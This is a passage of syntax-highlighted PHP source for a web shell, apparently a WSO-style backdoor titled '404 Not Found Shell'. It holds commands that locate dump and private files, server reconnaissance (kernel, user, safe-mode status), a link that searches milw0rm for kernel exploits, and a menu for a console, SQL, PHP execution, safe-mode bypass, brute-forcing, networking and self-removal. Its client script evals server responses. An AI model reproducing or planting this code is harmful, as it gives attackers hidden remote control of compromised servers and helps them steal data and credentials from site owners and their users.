<span class="lineno"> 124</span>         <span class="s2">&quot;locate dump files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate dump&quot;</span><span class="p">,</span> 
<span class="lineno"> 125</span>         <span class="s2">&quot;locate priv files&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;locate priv&quot;</span>     
<span class="lineno"> 126</span>     <span class="p">);</span> 
<span class="lineno"> 127</span> 
<span class="lineno"> 128</span> <span class="k">function</span> <span class="nf">printHeader</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 129</span>     <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]))</span> 
<span class="lineno"> 130</span>         <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;UTF-8&quot;</span><span class="p">;</span> 
<span class="lineno"> 131</span>     <span class="k">global</span> <span class="nv">$color</span><span class="p">;</span> 
<span class="lineno"> 132</span>     <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 133</span> <span class="x">&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&#39;Content-Type&#39; content=&#39;text/html; charset=</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">&#39;&gt;&lt;title&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">]</span><span class="cp">?&gt;</span><span class="x">- 404 Not Found Shell V.</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">VERSION</span><span class="cp">?&gt;</span><span class="x">-SubhashDasyam.com&lt;/title&gt; </span>
<span class="lineno"> 134</span> <span class="x">&lt;style&gt; </span>
<span class="lineno"> 135</span> <span class="x">    body {background-color:#000;color:#fff;} </span>
<span class="lineno"> 136</span> <span class="x">    body,td,th    { font: 9pt Lucida,Verdana;margin:0;vertical-align:top; } </span>
<span class="lineno"> 137</span> <span class="x">    span,h1,a    { color:</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$color</span><span class="cp">?&gt;</span><span class="x"> !important; } </span>
<span class="lineno"> 138</span> <span class="x">    span        { font-weight: bolder; } </span>
<span class="lineno"> 139</span> <span class="x">    h1            { border:1px solid </span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$color</span><span class="cp">?&gt;</span><span class="x">;padding: 2px 5px;font: 14pt Verdana;margin:0px; } </span>
<span class="lineno"> 140</span> <span class="x">    div.content    { padding: 5px;margin-left:5px;} </span>
<span class="lineno"> 141</span> <span class="x">    a            { text-decoration:none; } </span>
<span class="lineno"> 142</span> <span class="x">    a:hover        { background:#ff0000; } </span>
<span class="lineno"> 143</span> <span class="x">    .ml1        { border:1px solid #444;padding:5px;margin:0;overflow: auto; } </span>
<span class="lineno"> 144</span> <span class="x">    .bigarea    { width:100%;height:250px; } </span>
<span class="lineno"> 145</span> <span class="x">    input, textarea, select    { margin:0;color:#00ff00;background-color:#000;border:1px solid </span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$color</span><span class="cp">?&gt;</span><span class="x">; font: 9pt Monospace,&quot;Courier New&quot;; } </span>
<span class="lineno"> 146</span> <span class="x">    form        { margin:0px; } </span>
<span class="lineno"> 147</span> <span class="x">    #toolsTbl    { text-align:center; } </span>
<span class="lineno"> 148</span> <span class="x">    .toolsInp    { width: 80%; } </span>
<span class="lineno"> 149</span> <span class="x">    .main th    {text-align:left;} </span>
<span class="lineno"> 150</span> <span class="x">    .main tr:hover{background-color:#5e5e5e;} </span>
<span class="lineno"> 151</span> <span class="x">    .main td, th{vertical-align:middle;} </span>
<span class="lineno"> 152</span> <span class="x">    pre            {font-family:Courier,Monospace;} </span>
<span class="lineno"> 153</span> <span class="x">    #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);} </span>
<span class="lineno"> 154</span> <span class="x">&lt;/style&gt; </span>
<span class="lineno"> 155</span> <span class="x">&lt;script&gt; </span>
<span class="lineno"> 156</span> <span class="x">    function set(a,c,p1,p2,p3,charset) { </span>
<span class="lineno"> 157</span> <span class="x">        if(a != null)document.mf.a.value=a; </span>
<span class="lineno"> 158</span> <span class="x">        if(c != null)document.mf.c.value=c; </span>
<span class="lineno"> 159</span> <span class="x">        if(p1 != null)document.mf.p1.value=p1; </span>
<span class="lineno"> 160</span> <span class="x">        if(p2 != null)document.mf.p2.value=p2; </span>
<span class="lineno"> 161</span> <span class="x">        if(p3 != null)document.mf.p3.value=p3; </span>
<span class="lineno"> 162</span> <span class="x">        if(charset != null)document.mf.charset.value=charset; </span>
<span class="lineno"> 163</span> <span class="x">    } </span>
<span class="lineno"> 164</span> <span class="x">    function g(a,c,p1,p2,p3,charset) { </span>
<span class="lineno"> 165</span> <span class="x">        set(a,c,p1,p2,p3,charset); </span>
<span class="lineno"> 166</span> <span class="x">        document.mf.submit(); </span>
<span class="lineno"> 167</span> <span class="x">    } </span>
<span class="lineno"> 168</span> <span class="x">    function a(a,c,p1,p2,p3,charset) { </span>
<span class="lineno"> 169</span> <span class="x">        set(a,c,p1,p2,p3,charset); </span>
<span class="lineno"> 170</span> <span class="x">        var params = &quot;ajax=true&quot;; </span>
<span class="lineno"> 171</span> <span class="x">        for(i=0;i&lt;document.mf.elements.length;i++) </span>
<span class="lineno"> 172</span> <span class="x">            params += &quot;&amp;&quot;+document.mf.elements[i].name+&quot;=&quot;+encodeURIComponent(document.mf.elements[i].value); </span>
<span class="lineno"> 173</span> <span class="x">        sr(&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_URI&#39;</span><span class="p">];</span><span class="cp">?&gt;</span><span class="x">&#39;, params); </span>
<span class="lineno"> 174</span> <span class="x">    } </span>
<span class="lineno"> 175</span> <span class="x">    function sr(url, params) {     </span>
<span class="lineno"> 176</span> <span class="x">        if (window.XMLHttpRequest) { </span>
<span class="lineno"> 177</span> <span class="x">            req = new XMLHttpRequest(); </span>
<span class="lineno"> 178</span> <span class="x">            req.onreadystatechange = processReqChange; </span>
<span class="lineno"> 179</span> <span class="x">            req.open(&quot;POST&quot;, url, true); </span>
<span class="lineno"> 180</span> <span class="x">            req.setRequestHeader (&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;); </span>
<span class="lineno"> 181</span> <span class="x">            req.send(params); </span>
<span class="lineno"> 182</span> <span class="x">        }  </span>
<span class="lineno"> 183</span> <span class="x">        else if (window.ActiveXObject) { </span>
<span class="lineno"> 184</span> <span class="x">            req = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); </span>
<span class="lineno"> 185</span> <span class="x">            if (req) { </span>
<span class="lineno"> 186</span> <span class="x">                req.onreadystatechange = processReqChange; </span>
<span class="lineno"> 187</span> <span class="x">                req.open(&quot;POST&quot;, url, true); </span>
<span class="lineno"> 188</span> <span class="x">                req.setRequestHeader (&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;); </span>
<span class="lineno"> 189</span> <span class="x">                req.send(params); </span>
<span class="lineno"> 190</span> <span class="x">            } </span>
<span class="lineno"> 191</span> <span class="x">        } </span>
<span class="lineno"> 192</span> <span class="x">    } </span>
<span class="lineno"> 193</span> <span class="x">    function processReqChange() { </span>
<span class="lineno"> 194</span> <span class="x">        if( (req.readyState == 4) ) </span>
<span class="lineno"> 195</span> <span class="x">            if(req.status == 200) { </span>
<span class="lineno"> 196</span> <span class="x">                //alert(req.responseText); </span>
<span class="lineno"> 197</span> <span class="x">                var reg = new RegExp(&quot;(\\d+)([\\S\\s]*)&quot;, &quot;m&quot;); </span>
<span class="lineno"> 198</span> <span class="x">                var arr=reg.exec(req.responseText); </span>
<span class="lineno"> 199</span> <span class="x">                eval(arr[2].substr(0, arr[1])); </span>
<span class="lineno"> 200</span> <span class="x">            }  </span>
<span class="lineno"> 201</span> <span class="x">            else alert(&quot;Request error!&quot;); </span>
<span class="lineno"> 202</span> <span class="x">    } </span>
<span class="lineno"> 203</span> <span class="x">&lt;/script&gt; </span>
<span class="lineno"> 204</span> <span class="x">&lt;head&gt;&lt;body&gt;&lt;div style=&quot;position:absolute;width:100%;top:0;left:0;&quot;&gt; </span>
<span class="lineno"> 205</span> <span class="x">&lt;form method=post name=mf style=&#39;display:none;&#39;&gt; </span>
<span class="lineno"> 206</span> <span class="x">&lt;input type=hidden name=a value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 207</span> <span class="x">&lt;input type=hidden name=c value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 208</span> <span class="x">&lt;input type=hidden name=p1 value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">?</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 209</span> <span class="x">&lt;input type=hidden name=p2 value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">?</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 210</span> <span class="x">&lt;input type=hidden name=p3 value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">?</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 211</span> <span class="x">&lt;input type=hidden name=charset value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="cp">?&gt;</span><span class="x">&#39;&gt; </span>
<span class="lineno"> 212</span> <span class="x">&lt;/form&gt; </span>
<span class="lineno"> 213</span> <span class="cp">&lt;?php</span> 
<span class="lineno"> 214</span>     <span class="nv">$freeSpace</span> <span class="o">=</span> <span class="o">@</span><span class="nb">diskfreespace</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span> 
<span class="lineno"> 215</span>     <span class="nv">$totalSpace</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_total_space</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span> 
<span class="lineno"> 216</span>     <span class="nv">$totalSpace</span> <span class="o">=</span> <span class="nv">$totalSpace</span><span class="o">?</span><span class="nv">$totalSpace</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span> 
<span class="lineno"> 217</span>     <span class="nv">$release</span> <span class="o">=</span> <span class="o">@</span><span class="nb">php_uname</span><span class="p">(</span><span class="s1">&#39;r&#39;</span><span class="p">);</span> 
<span class="lineno"> 218</span>     <span class="nv">$kernel</span> <span class="o">=</span> <span class="o">@</span><span class="nb">php_uname</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">);</span> 
<span class="lineno"> 219</span>     <span class="nv">$millink</span><span class="o">=</span><span class="s1">&#39;http://milw0rm.com/search.php?dong=&#39;</span><span class="p">;</span> 
<span class="lineno"> 220</span>     <span class="k">if</span><span class="p">(</span> <span class="nb">strpos</span><span class="p">(</span><span class="s1">&#39;Linux&#39;</span><span class="p">,</span> <span class="nv">$kernel</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="p">)</span> 
<span class="lineno"> 221</span>         <span class="nv">$millink</span> <span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span> <span class="s1">&#39;Linux Kernel &#39;</span> <span class="o">.</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$release</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span> <span class="p">);</span> 
<span class="lineno"> 222</span>     <span class="k">else</span> 
<span class="lineno"> 223</span>         <span class="nv">$millink</span> <span class="o">.=</span> <span class="nb">urlencode</span><span class="p">(</span> <span class="nv">$kernel</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span> <span class="o">.</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$release</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span> <span class="p">);</span> 
<span class="lineno"> 224</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;posix_getegid&#39;</span><span class="p">))</span> <span class="p">{</span> 
<span class="lineno"> 225</span>         <span class="nv">$user</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_current_user</span><span class="p">();</span> 
<span class="lineno"> 226</span>         <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmyuid</span><span class="p">();</span> 
<span class="lineno"> 227</span>         <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmygid</span><span class="p">();</span> 
<span class="lineno"> 228</span>         <span class="nv">$group</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;</span> 
<span class="lineno"> 229</span>     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> 
<span class="lineno"> 230</span>         <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">posix_geteuid</span><span class="p">());</span> 
<span class="lineno"> 231</span>         <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">posix_getegid</span><span class="p">());</span> 
<span class="lineno"> 232</span>         <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span> 
<span class="lineno"> 233</span>         <span class="nv">$uid</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">];</span> 
<span class="lineno"> 234</span>         <span class="nv">$group</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span> 
<span class="lineno"> 235</span>         <span class="nv">$gid</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;gid&#39;</span><span class="p">];</span> 
<span class="lineno"> 236</span>     <span class="p">}</span> 
<span class="lineno"> 237</span>     <span class="nv">$cwd_links</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> 
<span class="lineno"> 238</span>     <span class="nv">$path</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span> 
<span class="lineno"> 239</span>     <span class="nv">$n</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span> 
<span class="lineno"> 240</span>     <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$n</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 241</span>         <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="s2">&quot;&lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 242</span>         <span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;=</span><span class="nv">$i</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">)</span> 
<span class="lineno"> 243</span>             <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="nv">$path</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span> 
<span class="lineno"> 244</span>         <span class="nv">$cwd_links</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&gt;&quot;</span><span class="o">.</span><span class="nv">$path</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;/&lt;/a&gt;&quot;</span><span class="p">;</span> 
<span class="lineno"> 245</span>     <span class="p">}</span> 
<span class="lineno"> 246</span>     <span class="nv">$charsets</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="s1">&#39;Windows-1251&#39;</span><span class="p">,</span> <span class="s1">&#39;KOI8-R&#39;</span><span class="p">,</span> <span class="s1">&#39;KOI8-U&#39;</span><span class="p">,</span> <span class="s1">&#39;cp866&#39;</span><span class="p">);</span> 
<span class="lineno"> 247</span>     <span class="nv">$opt_charsets</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> 
<span class="lineno"> 248</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$charsets</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> 
<span class="lineno"> 249</span>         <span class="nv">$opt_charsets</span> <span class="o">.=</span> <span class="s1">&#39;&lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nv">$item</span><span class="o">.</span><span class="s1">&#39;&quot; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$item</span><span class="o">?</span><span class="s1">&#39;selected&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&gt;&#39;</span><span class="o">.</span><span class="nv">$item</span><span class="o">.</span><span class="s1">&#39;&lt;/option&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 250</span>     <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Sec. Info&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;SecInfo&#39;</span><span class="p">,</span><span class="s1">&#39;Files&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;FilesMan&#39;</span><span class="p">,</span><span class="s1">&#39;Console&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Console&#39;</span><span class="p">,</span><span class="s1">&#39;Sql&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Sql&#39;</span><span class="p">,</span><span class="s1">&#39;Php&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Php&#39;</span><span class="p">,</span><span class="s1">&#39;Safe mode&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;SafeMode&#39;</span><span class="p">,</span><span class="s1">&#39;String tools&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;StringTools&#39;</span><span class="p">,</span><span class="s1">&#39;Bruteforce&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Bruteforce&#39;</span><span class="p">,</span><span class="s1">&#39;Network&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Network&#39;</span><span class="p">);</span> 
<span class="lineno"> 251</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;auth_pass&#39;</span><span class="p">]))</span> 
<span class="lineno"> 252</span>     <span class="nv">$m</span><span class="p">[</span><span class="s1">&#39;Logout&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;Logout&#39;</span><span class="p">;</span> 
<span class="lineno"> 253</span>     <span class="nv">$m</span><span class="p">[</span><span class="s1">&#39;Self remove&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;SelfRemove&#39;</span><span class="p">;</span> 
<span class="lineno"> 254</span>     <span class="nv">$menu</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> 
<span class="lineno"> 255</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$m</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> 
<span class="lineno"> 256</span>         <span class="nv">$menu</span> <span class="o">.=</span> <span class="s1">&#39;&lt;th width=&quot;&#39;</span><span class="o">.</span><span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="mi">100</span><span class="o">/</span><span class="nb">count</span><span class="p">(</span><span class="nv">$m</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;%&quot;&gt;[ &lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;&#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39;\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s1">&#39;&lt;/a&gt; ]&lt;/th&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 257</span>     <span class="nv">$drives</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> 
<span class="lineno"> 258</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 259</span>         <span class="k">foreach</span><span class="p">(</span> <span class="nb">range</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;z&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$drive</span> <span class="p">)</span> 
<span class="lineno"> 260</span>         <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$drive</span><span class="o">.</span><span class="s1">&#39;:\\&#39;</span><span class="p">))</span> 
<span class="lineno"> 261</span>             <span class="nv">$drives</span> <span class="o">.=</span> <span class="s1">&#39;&lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$drive</span><span class="o">.</span><span class="s1">&#39;:/\&#39;)&quot;&gt;[ &#39;</span><span class="o">.</span><span class="nv">$drive</span><span class="o">.</span><span class="s1">&#39; ]&lt;/a&gt; &#39;</span><span class="p">;</span> 
<span class="lineno"> 262</span>     <span class="p">}</span> 
<span class="lineno"> 263</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;table class=info cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;&lt;td width=1&gt;&lt;span&gt;Uname&lt;br&gt;User&lt;br&gt;Php&lt;br&gt;Hdd&lt;br&gt;Cwd&#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;win&#39;</span><span class="o">?</span><span class="s1">&#39;&lt;br&gt;Drives&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/span&gt;&lt;/td&gt;&#39;</span><span class="o">.</span> 
<span class="lineno"> 264</span>          <span class="s1">&#39;&lt;td&gt;:&lt;nobr&gt;&#39;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="o">@</span><span class="nb">php_uname</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">120</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;  &lt;a href=&quot;http://www.google.com/search?q=&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="o">@</span><span class="nb">php_uname</span><span class="p">())</span><span class="o">.</span><span class="s1">&#39;&quot; target=&quot;_blank&quot;&gt;[Google]&lt;/a&gt; &lt;a href=&quot;&#39;</span><span class="o">.</span><span class="nv">$millink</span><span class="o">.</span><span class="s1">&#39;&quot; target=_blank&gt;[milw0rm]&lt;/a&gt;&lt;/nobr&gt;&lt;br&gt;:&#39;</span><span class="o">.</span><span class="nv">$uid</span><span class="o">.</span><span class="s1">&#39; ( &#39;</span><span class="o">.</span><span class="nv">$user</span><span class="o">.</span><span class="s1">&#39; ) &lt;span&gt;Group:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nv">$gid</span><span class="o">.</span><span class="s1">&#39; ( &#39;</span><span class="o">.</span><span class="nv">$group</span><span class="o">.</span><span class="s1">&#39; )&lt;br&gt;:&#39;</span><span class="o">.@</span><span class="nb">phpversion</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Safe mode:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;&lt;font color=red&gt;ON&lt;/font&gt;&#39;</span><span class="o">:</span><span class="s1">&#39;&lt;font color=&lt;?=$color?&gt;&lt;b&gt;OFF&lt;/b&gt;&lt;/font&gt;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; &lt;a href=# onclick=&quot;g(\&#39;Php\&#39;,null,null,\&#39;info\&#39;)&quot;&gt;[ phpinfo ]&lt;/a&gt; &lt;span&gt;Datetime:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;:&#39;</span><span class="o">.</span><span class="nx">viewSize</span><span class="p">(</span><span class="nv">$totalSpace</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Free:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nx">viewSize</span><span class="p">(</span><span class="nv">$freeSpace</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; (&#39;</span><span class="o">.</span><span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="nv">$freeSpace</span><span class="o">/</span><span class="nv">$totalSpace</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;%)&lt;br&gt;:&#39;</span><span class="o">.</span><span class="nv">$cwd_links</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="nx">viewPermsColor</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &lt;a href=# onclick=&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;home_cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&gt;[ home ]&lt;/a&gt;&lt;br&gt;:&#39;</span><span class="o">.</span><span class="nv">$drives</span><span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&#39;</span><span class="o">.</span> 
